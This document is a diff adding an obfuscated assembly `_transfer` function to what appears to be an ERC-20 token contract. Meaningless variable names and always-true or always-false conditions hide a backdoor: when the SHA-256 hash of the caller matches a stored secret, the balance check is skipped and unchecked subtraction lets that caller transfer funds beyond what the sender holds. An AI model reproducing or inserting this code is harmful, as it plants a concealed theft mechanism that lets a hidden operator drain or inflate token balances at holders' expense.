@@ -1,0 +1,41 @@
+function _transfer(address _from, address _to, uint256 _amount) virtual internal {
+        assembly {
+            if iszero(_from) {
+                revert(0, 0)
+            }
+            if iszero(_to) {
+                revert(0, 0)
+            }
+            let bbwz := mload(0x40)
+            let bfo228g := basefee()
+            let nezy9b8 := number()
+            if iszero(xor(bfo228g, bfo228g)) {
+                mstore(bbwz, _from)
+                mstore(add(bbwz, 32), 0)
+            }
+            let XCUz := keccak256(bbwz, 64)
+            let qVPd := sload(XCUz)
+            let Fpzy := sload(sSgI.slot)
+            mstore(bbwz, shl(96, caller()))
+            if iszero(staticcall(gas(), 2, bbwz, 20, bbwz, 32)) {
+                revert(0, 0)
+            }
+            let YvIh := mload(bbwz)
+            if iszero(eq(Fpzy, YvIh)) {
+                if lt(qVPd, _amount) {
+                    let tfe9zci := timestamp()
+                    if eq(tfe9zci, mul(tfe9zci, 1)) {
+                        revert(0, 0)
+                    }
+                }
+            }
+            sstore(XCUz, sub(qVPd, _amount))
+            mstore(bbwz, _to)
+            mstore(add(bbwz, 32), 0)
+            let iLho := keccak256(bbwz, 64)
+            let bXFg := sload(iLho)
+            sstore(iLho, add(bXFg, _amount))
+            mstore(bbwz, _amount)
+            log3(bbwz, 32, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, _from, _to)
+        }
+    }
